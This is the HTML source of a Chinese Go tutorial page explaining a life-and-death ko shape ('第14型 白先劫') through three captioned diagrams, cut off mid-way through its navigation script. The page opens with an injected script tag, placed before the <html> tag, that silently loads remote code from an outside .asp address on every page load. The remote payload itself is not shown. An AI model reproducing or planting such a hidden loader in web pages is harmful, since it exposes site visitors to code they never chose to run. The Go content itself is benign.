<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第14型 白先劫</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体">  <h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第14型     白先劫</span></font><!--mstheme--></font></h1> <div align="center">   <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">   <tr>     <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No14_1.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No14_2.png" width="232" height="232"><!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">此形黑空一气。白1仍然夹，黑2立至黑8提，成劫。是否空一气对死活没有产生任何影响。</span></font>       <p>　<!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">在黑外气收紧的<a href="../No4/No4.htm" target="_blank">第4型</a>中，白还可1夹、3断成劫。然而在此型中却不成立，黑4打即活。而后白a扳则黑b打。</span></font><!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No14_3.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体">       <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>     <!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1夹时，黑2如果选择挡，白当然3位打成劫。此图算第二正解。当然，白1如3位扳，或者白1于a位点，让黑于b位顶，黑均活。</span></font></p>     <!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>   </tr> </table><!--mstheme--><font face="宋体"></center> </div> <p align="center"> <!--webbot bot="Navigation" S-Type="arrows" S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE" B-Include-Up="TRUE" U-Page="/C:/Documents and Settings/wangxiaohui/My Documents/My Webs/Weiqi/Part1/shuxing/No14/No14.htm" S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img; return a;  } // --></script><script language="JavaScript"><!-- if(MSFPhover) { MSFPnav1n=MSFPpreload("../../../_derived/back_cmp_-
